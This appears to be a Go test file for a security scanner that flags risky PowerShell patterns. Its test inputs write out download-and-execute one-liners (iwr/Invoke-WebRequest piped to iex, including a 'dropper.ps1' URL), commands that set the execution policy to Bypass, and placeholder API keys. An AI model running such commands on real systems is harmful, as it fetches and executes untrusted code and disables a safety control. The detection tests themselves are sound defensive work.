package builtin

import (
	"strings"
	"testing"

	"github.com/harshmaur/audr/internal/parse"
)

// TestRule_PowerShellIWRIEX: the canonical `iwr <url> | iex` pipeline
// triggers powershell-iwr-iex regardless of alias spelling.
func TestRule_PowerShellIWRIEX(t *testing.T) {
	cases := []struct {
		name string
		src  string
		want bool
	}{
		{
			name: "iwr|iex short alias",
			src:  `iwr https://example.test/setup.ps1 | iex` + "\n",
			want: true,
		},
		{
			name: "Invoke-WebRequest | Invoke-Expression long form",
			src:  `Invoke-WebRequest https://example.test/x.ps1 | Invoke-Expression` + "\n",
			want: true,
		},
		{
			name: "irm|iex (REST flavor)",
			src:  `irm https://example.test/api.json | iex` + "\n",
			want: true,
		},
		{
			name: "Net.WebClient with DownloadString then iex (no pipeline)",
			src:  `(New-Object Net.WebClient).DownloadString("https://x.test/y.ps1") | iex` + "\n",
			want: true,
		},
		{
			name: "intermediate stage between fetch and exec",
			src:  `iwr https://x.test/y.ps1 | ForEach-Object { $_ } | iex` + "\n",
			want: true,
		},
		{
			name: "negative: fetch without exec",
			src:  `iwr https://x.test/y.json | ConvertFrom-Json` + "\n",
			want: false,
		},
		{
			name: "negative: exec without fetch",
			src:  `Get-Content x.ps1 | iex` + "\n",
			want: false,
		},
		{
			name: "negative: wrong order (exec before fetch)",
			src:  `iex "Get-Date" | iwr https://x.test/log` + "\n",
			want: false,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			doc := parse.Parse(`C:\Users\X\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1`,
				[]byte(tc.src))
			if doc.Format != parse.FormatPowerShellProfile {
				t.Fatalf("format = %q, want powershell-profile", doc.Format)
			}
			got := fired(doc, "powershell-iwr-iex")
			if got != tc.want {
				t.Errorf("powershell-iwr-iex fired = %v, want %v\nrules fired: %v",
					got, tc.want, applyRule(doc))
			}
		})
	}
}

// TestRule_PowerShellIWRIEX_FiresOnHistory: PSReadLine ConsoleHost_history
// captures the same syntax — make sure the rule catches commands users
// already executed, not just profile-script ones.
func TestRule_PowerShellIWRIEX_FiresOnHistory(t *testing.T) {
	src := `Get-Date
iwr https://malicious.test/dropper.ps1 | iex
Get-Process | Select-Object Name
`
	doc := parse.Parse(`C:\Users\X\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`,
		[]byte(src))
	if doc.Format != parse.FormatPowerShellProfile {
		t.Fatalf("ConsoleHost_history should classify as powershell-profile, got %q", doc.Format)
	}
	if !fired(doc, "powershell-iwr-iex") {
		t.Errorf("iwr|iex in history should fire; rules fired: %v", applyRule(doc))
	}
}

// TestRule_PowerShellSecretEnv: $env:KEY = "credential-shaped" fires.
func TestRule_PowerShellSecretEnv(t *testing.T) {
	cases := []struct {
		name string
		src  string
		want bool
	}{
		{
			name: "GitHub PAT classic prefix",
			src:  `$env:GH_TOKEN = "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"` + "\n",
			want: true,
		},
		{
			name: "AWS access key",
			src:  `$env:AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"` + "\n",
			want: true,
		},
		{
			name: "Anthropic key",
			src:  `$env:ANTHROPIC_API_KEY = "sk-ant-api03-cccccccccccccccccccccccccccccccccccccc"` + "\n",
			want: true,
		},
		{
			name: "UUID-shaped value bound to _AUTHTOKEN name",
			src:  `$env:FONTAWESOME_REGISTRY_AUTHTOKEN = "C407A854-DEF2-439E-B083-1FC313125858"` + "\n",
			want: true,
		},
		{
			name: "negative: PATH-style value, not a credential",
			src:  `$env:PATH = "C:\Users\X\bin;$env:PATH"` + "\n",
			want: false,
		},
		{
			name: "negative: NODE_ENV value",
			src:  `$env:NODE_ENV = "production"` + "\n",
			want: false,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			doc := parse.Parse(`C:\Users\X\Documents\PowerShell\profile.ps1`,
				[]byte(tc.src))
			got := fired(doc, "powershell-secret-env")
			if got != tc.want {
				t.Errorf("powershell-secret-env fired = %v, want %v\nrules fired: %v",
					got, tc.want, applyRule(doc))
			}
		})
	}
}

// TestRule_PowerShellExecutionPolicyBypass: Set-ExecutionPolicy with
// Bypass / Unrestricted fires; safer policies do not.
func TestRule_PowerShellExecutionPolicyBypass(t *testing.T) {
	cases := []struct {
		name string
		src  string
		want bool
	}{
		{
			name: "Bypass",
			src:  `Set-ExecutionPolicy Bypass -Scope CurrentUser -Force` + "\n",
			want: true,
		},
		{
			name: "Unrestricted",
			src:  `Set-ExecutionPolicy Unrestricted` + "\n",
			want: true,
		},
		{
			name: "Bypass with named -ExecutionPolicy",
			src:  `Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser` + "\n",
			want: true,
		},
		{
			name: "negative: RemoteSigned (the default, fine)",
			src:  `Set-ExecutionPolicy RemoteSigned -Scope CurrentUser` + "\n",
			want: false,
		},
		{
			name: "negative: AllSigned",
			src:  `Set-ExecutionPolicy AllSigned` + "\n",
			want: false,
		},
		{
			name: "negative: Restricted",
			src:  `Set-ExecutionPolicy Restricted` + "\n",
			want: false,
		},
		{
			name: "negative: word Bypass inside a string literal, not a command",
			src:  `Write-Host "ExecutionPolicy is Bypass-friendly"` + "\n",
			want: false,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			doc := parse.Parse(`C:\Users\X\Documents\PowerShell\profile.ps1`,
				[]byte(tc.src))
			got := fired(doc, "powershell-execution-policy-bypass")
			if got != tc.want {
				t.Errorf("powershell-execution-policy-bypass fired = %v, want %v\nrules fired: %v",
					got, tc.want, applyRule(doc))
			}
		})
	}
}

// TestRule_PowerShellIWRIEX_OneFindingPerPipeline: a pipeline with
// multiple exec stages downstream of the fetch must produce ONE
// finding, not N. Anchors the `break` in the rule body.
func TestRule_PowerShellIWRIEX_OneFindingPerPipeline(t *testing.T) {
	src := `iwr https://x.test/y.ps1 | iex | iex` + "\n"
	doc := parse.Parse(`C:\Users\X\Documents\PowerShell\profile.ps1`, []byte(src))
	count := 0
	for _, id := range applyRule(doc) {
		if id == "powershell-iwr-iex" {
			count++
		}
	}
	if count != 1 {
		t.Errorf("expected 1 finding for one pipeline, got %d", count)
	}
}

// TestRule_PowerShellRules_DoNotFireOnShellRC: confidence check that
// the format dispatch isolates the PowerShell rules. A .bashrc with
// `iwr | iex` text in it (legal shell content) MUST NOT trigger any
// powershell-* rule.
func TestRule_PowerShellRules_DoNotFireOnShellRC(t *testing.T) {
	src := `iwr https://x.test/y.ps1 | iex
export GITHUB_TOKEN="ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
`
	doc := parse.Parse("/home/u/.bashrc", []byte(src))
	for _, id := range applyRule(doc) {
		if strings.HasPrefix(id, "powershell-") {
			t.Errorf("powershell rule %q fired on a shellrc doc — format isolation broken", id)
		}
	}
}
